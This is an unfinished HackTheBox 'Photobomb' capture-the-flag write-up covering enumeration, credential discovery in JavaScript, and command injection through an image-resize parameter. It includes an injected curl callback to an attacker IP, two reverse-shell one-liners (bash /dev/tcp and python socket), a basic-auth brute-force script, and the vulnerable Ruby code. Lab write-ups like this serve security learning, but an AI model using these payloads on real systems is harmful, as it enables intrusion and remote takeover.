# HackTheBox Photobomb Writeup
<!-- Description -->
![photobomb](imgs/machine.png)
Completed on ??/??/20??
<!-- /Description -->
## Table of Contents
<!-- TOC -->
- [HackTheBox - Photobomb - WriteUp](#hackthebox-photobomb-writeup)
  - [Table of Contents](#table-of-contents)
  - [Let's Get Going!](#lets-get-going)
    - [Enumeration](#enumeration)
      - [Nmap Scan](#nmap-scan)
    - [Exploitation](#exploitation)
    - [Post Exploitation](#post-exploitation)
<!-- /TOC -->
---
## Let's Get Going
### Enumeration
#### Nmap Scan
We start as usual with the nmap scan 
```bash
$ nmap -sC -sV -oN nmap/initial $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 13:48 EST
Nmap scan report for 10.10.11.182
Host is up (0.094s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Lets explore further http on port 80

#### Exploring the website
After editing /etc/hosts and visiting the website, we get the following
![photobomb](imgs/website.png)
Clicking the hyperlink directs us to a login form which we will surely try to manipulate! The page source returned nothing interesting. We continued by checking what the server returns in case of bad request
```
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
```
And the 404 response
![photobomb](imgs/404.png)
Looking at the source page, we find a local URL with a port number
```html
 <img src='http://127.0.0.1:4567/__sinatra__/404.png'>
```
We attempted several scans on the port to see if it is active but got no positive results back
#### Nikto scan
We run the nikto scan to get a primary view of possible problems with our website
```bash
$ nikto -h http://$IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.182
+ Target Hostname:    10.10.11.182
+ Target Port:        80
+ Start Time:         2023-01-31 13:48:51 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://photobomb.htb/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ 1 host(s) tested
+ End Time:           2023-01-31 14:08:06 (GMT-5) (1155 seconds)
---------------------------------------------------------------------------
```
#### Directory Fuzzing
After running the fuzzing for a while, we notice that all results found contain printer and some other characters and they all require authentication to access them. After trying different combinations and getting same response 401 ("/printera", "/printerb"..), we can realise that the developpers must have wanted to block the "/printer/" directory so they return 401 for all "/printer*" URI requests. 
```bash
$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://photobomb.htb/FUZZ -e ".php,.html" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://photobomb.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________
printer                 [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 159ms]
printer.php             [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 156ms]
printer.html            [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 150ms]
printers.php            [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 159ms]
printers                [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 163ms]
printers.html           [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 164ms]
printerfriendly         [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 139ms]
printerfriendly.php     [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 142ms]
printerfriendly.html    [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 144ms]
printer_friendly        [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 149ms]
printer_friendly.php    [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 152ms]
printer_friendly.html   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 156ms]
printer_icon            [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 139ms]
printer_icon.php        [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 143ms]
printer_icon.html       [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 140ms]
printer-icon            [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 180ms]
printer-icon.php        [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 179ms]
printer-icon.html       [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 172ms]
printer-friendly        [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 144ms]
printer-friendly.php    [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 137ms]
printer-friendly.html   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 140ms]
printerFriendly         [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 151ms]
printerFriendly.php     [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 151ms]
printerFriendly.html    [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 148ms]
``` 
---
### Exploitation
#### Login Form
We can try different tactics to break this login form, which is until now the only clue we have.
For starters, we attempt to test it with burpsuite. The auth request goes as follows
```http
GET /printer HTTP/1.1
Host: photobomb.htb
Cache-Control: max-age=0
Authorization: Basic d3E6cXdxdw==
```
And the server response
```http
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 01 Feb 2023 10:45:18 GMT
Content-Type: text/html
Content-Length: 590
Connection: close
WWW-Authenticate: Basic realm="Admin Area"
```
So a GET request is sent with the header Authorization containing the value of the base64 of "username:password". In the server's response, we can see the header 'WWW-Authenticate' which specifies what area of the website we are trying to authenticate to. As its called "Admin Area", we can try to bruteforce the login form with username 'admin'. To do that we write a small script in python that concatenates a list of passwords with the username admin then base64 encodes them and stores them in a file to be used as a payloads file.
```python
from base64 import b64encode

with open("/usr/share/wordlists/rockyou.txt","r", errors='ignore') as pass_file:
	pass_list= pass_file.readlines()

with open('./payloads.txt','w') as payloads:
	for i in range(len(pass_list)):
		concat = 'admin:'+pass_list[i]
		try:
			encode= b64encode(concat.encode('ascii')).decode('ascii')
			payloads.write(encode+'\n')
		except:
			continue
```
We then pass them to ffuf
```bash
$ ffuf -w payloads.txt -u http://photobomb.htb/printer -H "Authorization: Basic FUZZ" -fc 401
```
We got not results. Re-tried same thing with different username, no result as well.
After going through the website again I noticed a javascript file that I hadn't checked before
```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
Looking at it closely, we can see that there's a URL that points to the login form alongside what looks like credentials and a comment about tech support. Turns out at last that the credentials are pH0t0:b0Mb!. Looking through http Authorization docs we found that its possible to pass credentials to http Basic Authorization in the URL.

#### Photo Galery and command injection
Upon logging in we find the following page

![photobomb](imgs/photos.png)

After searhing around ???? so we try download button

```http
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 74
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg&dimensions=30x20
```

Makes POST request with parameters... ???
Could it be vulnerable ? We decided to test it by doing some input fuzzing
First we set up a local php server to try and capture anything that our tests output
```bash
$ php -S 0.0.0.0:8000                                                        
[Wed Feb  1 13:28:23 2023] PHP 8.1.12 Development Server (http://0.0.0.0:8000) started
```
???After tries it was successful

```http
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 102
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg%0acurl%2010.10.14.161:8000/&dimensions=30x20
```
We captured it on our local server
```http
[Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 Accepted
[Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 [404]: GET / - No such file or directory
[Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 Closing
[Wed Feb  1 13:29:17 2023] 10.10.11.182:57208 Accepted
[Wed Feb  1 13:29:17 2023] 10.10.11.182:57208 [404]: GET /.jpg - No such file or directory
[Wed Feb  1 13:29:17 2023] 10.10.11.182:57208 Closing
```
Amazing, lets try to get some info out of it before attempting to spawn a reverse shell

```
[Wed Feb  1 13:45:31 2023] 10.10.11.182:59600 [404]: GET /?wizard - No such file or directory
[Wed Feb  1 13:46:07 2023] 10.10.11.182:35262 [404]: GET /?/home/wizard/photobomb - No such file or directory
```
We can attempt know and spawn a reverse shell. To do that we use [Reverse Shells Generator](https://www.revshells.com/). We tried at first to spawn a shell with bash but it was unsuccessful. So we tried to use python and it worked! We have access now to the machine. 
```bash
$ sh -i >& /dev/tcp/10.10.14.112/8000 0>&1
```
```python
$ export RHOST="10.10.14.112";export RPORT=8000;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
whoami
```bash
$ whoami
wizzard
```
#### Source code
I tried looking at the server source code to further understand the reason behind the command injection in ruby
```ruby
photo = params[:photo]
filetype = params[:filetype]
dimensions = params[:dimensions]

if !File.exists?('resized_images/' + filename)
  command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
  puts "Executing: #{command}"
  system(command)
```
Basically, the input retrieved from the post request was not sanitized and was directly concatenated with a shell command that was put in place to resize images. In our injection, we used %0a which decodes to line break. This breaks the command and allows the execution of our payload.
---
### Post Exploitation
---

> Any feedback would be appreciated. Thank you !
